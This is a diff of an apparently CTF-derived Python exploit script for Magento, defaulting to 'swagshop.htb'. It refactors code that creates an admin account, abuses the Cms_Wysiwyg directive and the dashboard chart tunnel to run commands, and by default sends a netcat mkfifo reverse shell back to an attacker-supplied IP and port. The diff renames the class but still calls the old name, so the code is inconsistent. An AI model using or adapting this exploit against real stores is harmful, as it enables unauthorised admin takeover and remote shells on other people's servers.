@@ -16,13 +16,14 @@ from hashlib import md5
 from argparse import ArgumentParser
 
 
-class SwagShopIntruder:
+class MagentoIntruder:
     def __init__(self, admin_login_url: str, domain: str = "http://swagshop.htb"):
+        self.domain = domain
         self.url = f"{domain}/{admin_login_url}"
         self.sqli_target = f"{admin_login_url}/Cms_Wysiwyg/directive/index/"
 
-    def infer_date_in_app_local_xml(self, app_local_xml: str = "/app/etc/local.xml"):
-        response = requests.get(f"{self.url}/{app_local_xml}")
+    def infer_date_in_app_local_xml(self, app_local_xml: str = "app/etc/local.xml"):
+        response = requests.get(f"{self.domain}/{app_local_xml}")
         if response.ok:
             # Parse the XML response given by the server
             xml_data = xmltodict.parse(response.text)
@@ -112,15 +113,18 @@ class SwagShopIntruder:
             % (len(php_function), php_function, len(cmd), cmd)
         )
 
-        request = browser.open(url + 'block/tab_orders/period/7d/?isAjax=true', data='isAjax=false&form_key=' + key)
-        tunnel_match = re.search("src=\"(.*)\?ga=", request.read().decode())
+        request = browser.open(
+            url + "block/tab_orders/period/7d/?isAjax=true",
+            data="isAjax=false&form_key=" + key,
+        )
+        tunnel_match = re.search('src="(.*)\?ga=', request.read().decode())
         if tunnel_match is not None:
             self.print_success_text("Payload sent successfully!")
             tunnel = tunnel_match.group(1)
 
             payload_encoded = base64.b64encode(payload.encode())
             gh = md5(payload_encoded + date.encode()).hexdigest()
-            exploit = tunnel + '?ga=' + payload_encoded.decode() + '&h=' + gh
+            exploit = tunnel + "?ga=" + payload_encoded.decode() + "&h=" + gh
             self.print_success_text("Sending exploit ...")
             try:
                 response = browser.open(exploit)
@@ -128,11 +132,10 @@ class SwagShopIntruder:
                 self.print_success_text(f"Got answer: {e.read().decode()}")
 
 
-def exploit(base_path: str, login_url: str, bind_ip: str, bind_port: int):
+def exploit(base_path: str, login_url: str, bind_ip: str, bind_port: int, cmd: str):
     intruder = SwagShopIntruder(admin_login_url=login_url, domain=base_path)
     username, password = intruder.create_admin_user()
     if username is not None and password is not None:
-        cmd = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {bind_ip} {bind_port} >/tmp/f"
         intruder.run_cmd(cmd, username, password)
     else:
         intruder.print_error_text("Impossible to continue. Exiting ...")
@@ -142,10 +145,29 @@ def exploit(base_path: str, login_url: str, bind_ip: str, bind_port: int):
 if __name__ == "__main__":
     # Parse script arguments to obtain the base path, login URL, bind IP and bind port
     parser = ArgumentParser()
-    parser.add_argument("--base-path", help="Base path of the Magento instance machine", required=True)
+    parser.add_argument(
+        "--base-path", help="Base path of the Magento instance machine", required=True
+    )
     parser.add_argument("--login-url", help="Admin login URL", default="admin")
-    parser.add_argument("--bind-ip", help="IP address to bind the reverse shell", required=True)
-    parser.add_argument("--bind-port", help="Port to bind the reverse shell", required=True, type=int, default=9000)
+    parser.add_argument(
+        "--ip", help="IP address to bind the reverse shell", required=True
+    )
+    parser.add_argument(
+        "--port",
+        help="Port to bind the reverse shell",
+        required=True,
+        type=int,
+        default=9000,
+    )
+    parser.add_argument(
+        "--cmd",
+        help="Command to run in the target machine. Defaults to a nc based onliner reverse shell using ip and port",
+        required=False,
+    )
 
     args = parser.parse_args()
-    exploit(args.base_path, args.login_url, args.bind_ip, args.bind_port)
+    cmd = (
+        args.cmd
+        or f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {args.ip} {args.port} >/tmp/f"
+    )
+    exploit(args.base_path, args.login_url, args.ip, args.port, cmd)
